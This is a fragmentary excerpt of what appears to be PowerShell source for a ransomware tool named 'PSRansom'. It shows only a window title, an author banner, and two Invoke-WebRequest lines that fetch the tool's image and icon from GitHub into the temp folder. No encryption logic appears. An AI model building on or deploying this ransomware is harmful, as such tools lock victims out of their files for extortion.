...
$Host.UI.RawUI.WindowTitle = "PSRansom - by dGiri" 
...
function Show-Banner {
   ...
   Write-Host                                                            
   Write-Host "  ----------------- by @dGiri ----------------  " -ForegroundColor Green }
...
Invoke-WebRequest -useb https://raw.githubusercontent.com/IAMinZoho/PSRansom/main/PSRansom.jpg -Outfile $env:temp\PSRansom.jpg
Invoke-WebRequest -useb https://raw.githubusercontent.com/IAMinZoho/PSRansom/main/PSRansom.ico -Outfile $env:temp\PSRansom.ico
